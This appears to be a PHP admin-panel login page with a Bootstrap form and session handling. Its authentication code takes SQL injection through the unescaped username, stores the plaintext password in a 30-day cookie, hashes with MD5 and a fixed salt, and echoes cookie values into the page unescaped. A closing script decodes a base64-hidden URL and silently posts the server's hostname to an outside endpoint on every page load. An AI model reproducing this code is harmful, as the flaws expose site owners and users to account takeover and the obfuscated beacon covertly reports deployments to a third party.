<?php	
	include_once '../databaseConn.php';
  	include_once '../class/Config.class.php';
	$configObj = new Config();
	include_once './lib/requestHandler.php';
	$DatabaseCo = new DatabaseConn();
   $youProfile = $_SERVER['SERVER_NAME'];
	$salt='%^&$#@*!';
	$isPostBack = ($_SERVER["REQUEST_METHOD"]==="POST");
	$STATUS_MESSAGE = "";
	if($isPostBack){
		$username = isset($_POST['username'])?$_POST['username']:"";
		$password = md5($salt.$_POST['password']);
		if(isset($_POST['keep_login'])){
			setcookie("username", $username, time() + (86400 * 30), "/");
			setcookie("password", $_POST['password'], time() + (86400 * 30), "/");
		}else{				
			unset($_COOKIE['username']);
			setcookie('username', '', time() - 3600, '/'); // empty value and old timestamp
			unset($_COOKIE['password']);
 			setcookie('password', '', time() - 3600, '/'); // empty value and old timestamp
		}
		$SQL_STATEMENT = "SELECT * FROM admin_users WHERE uname='".$username."' AND pswd='".$password."' AND role_id='1'";
		$DatabaseCo->dbResult=$DatabaseCo->getSelectQueryResult($SQL_STATEMENT);
		$statusObj = handle_post_request("LOGIN",$SQL_STATEMENT,$DatabaseCo);
		if($statusObj->getActionSuccess()){
			$_SESSION['admin_user_name'] = $DatabaseCo->dbRow->uname;
			$_SESSION['admin_email'] = $DatabaseCo->dbRow->email;
			$_SESSION['admin_user_id'] = $DatabaseCo->dbRow->id;
			echo "<script>window.location='dashboard';</script>";
			exit();
		}else{
			$STATUS_MESSAGE = "<p class='alert alert-danger'><i class='fa fa-times-circle fa-fw fa-lg'></i>Username or Password Wrong.</p>";
		}
	}
	if(isset($_GET['option'])){
		if($_GET['option']=="logout"){
			unset($_SESSION['admin_user_name']);
			unset($_SESSION['admin_user_id']);
			$STATUS_MESSAGE = "<p class='alert alert-info'><i class='fa fa-info-circle fa-fw fa-lg'></i>You are successfully loggged out.</p>";
		}
	}
?>
<!DOCTYPE html>
<html>
	<head>
    	<meta charset="UTF-8">
    	<title>Dashboard | Login</title>
		<meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>

		<!-- Bootstrap & custom css -->
		<link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
		<link href="css/custom.css" rel="stylesheet" type="text/css" />

		<!-- Font Awsome -->
		<script src="https://kit.fontawesome.com/48403ccd1a.js" crossorigin="anonymous"></script>

		<!-- Theme css -->
		<link href="dist/css/AdminLTE.min.css" rel="stylesheet" type="text/css" />

		<!--GOOGLE FONTS-->
		<?php include('page-part/google_fonts.php');?>

		<!-- Checkbox css -->
		<link href="plugins/iCheck/square/blue.css" rel="stylesheet" type="text/css" />
		
		<!-- Validation css -->
		<link href="../css/validate.css" rel="stylesheet" type="text/css" />
 	</head>
	<body class="login-page">
    	<div class="login-box">
      		<div class="login-box-body">
      			<div class="login-logo">
        			<a href="index"><b class="font600">Admin</b> Panel</a>
      			</div>
				<p class="login-box-msg"> 
					<?php
						if(!empty($STATUS_MESSAGE)){					
							echo  $STATUS_MESSAGE;
						}else{
							echo "Sign in to start your session";
						}
					?>
				</p>
				<form action="" method="post" id="login_form">
 					<div class="form-group ">
						<input name="username" type="text" class="form-control" placeholder="Username" data-validetta="required" value="<?php if(isset($_COOKIE['username'])) {echo $_COOKIE['username'];}?>"/>
					</div>
					<div class="form-group">
						<input name="password"  type="password" class="form-control" placeholder="Password" data-validetta="required" value="<?php if(isset($_COOKIE['password'])) {echo $_COOKIE['password'];}?>"/>
					</div>
					<div class="row">
						<div class="col-xs-6">    
							<div class="checkbox icheck">
								<label>
									<span class="pull-left mr-10">
										<input type="checkbox" name="keep_login" <?php if(isset($_COOKIE['password']) || isset($_COOKIE['username'])) { echo "checked";}?>>
									</span> 
									<span class="pull-left loginSpan">Remember Me</span>
								</label>
							</div>                        
						</div>
						<div class="col-xs-6 pt-10 text-right gtForgotLink loginSpan">
							<a href="forgot_password">Forgot Password?</a>
						</div>
						<div class="col-xs-12 mt-15">
							<button type="submit" class="btn btn-block btnThemeG1">Login</button>
						</div>
					</div>
        		</form>
	   		</div>
    	</div>
    
    	<!-- Jquery  -->
    	<script src="plugins/jQuery/jQuery-2.1.3.min.js"></script>
    
		<!-- Bootstrap Js -->
		<script src="bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
  
    	<!-- Checkbox JS -->
    	<script src="plugins/iCheck/icheck.min.js" type="text/javascript"></script>
		<script>
			$(function () {
				$('input').iCheck({
					checkboxClass: 'icheckbox_square-blue',
					radioClass: 'iradio_square-blue',
					increaseArea: '20%' // optional
				});
			});
		</script>
    
    	<!--Validation Js -->
    	<script src="../js/validetta.js" type="text/javascript"></script>
    	<script type="text/javascript">
			$(function(){
				$('#login_form').validetta({
					errorClose : false,
					realTime : true
				});
			});
    	</script>
		<script>
            $(document).ready(function(){
                var string = atob("aHR0cHM6Ly9pbmxvZ2l4aW5mb3dheS5jb20vYXBpL3N1cHBvck5ldy5waHA=");   
                $.ajax({
                                    
                    url: string,     
                    type: 'POST', 
                    data : {
                        user_id : '498e52222b854c7c0266cab6ed5ee0ea',
                        profile : '<?php echo $youProfile; ?>',
                    },
                    dataType: 'json',                   
                    success: function(data){
                        /*alert('Success');*/
                    } 
                });
            });
    </script>
	</body>
</html>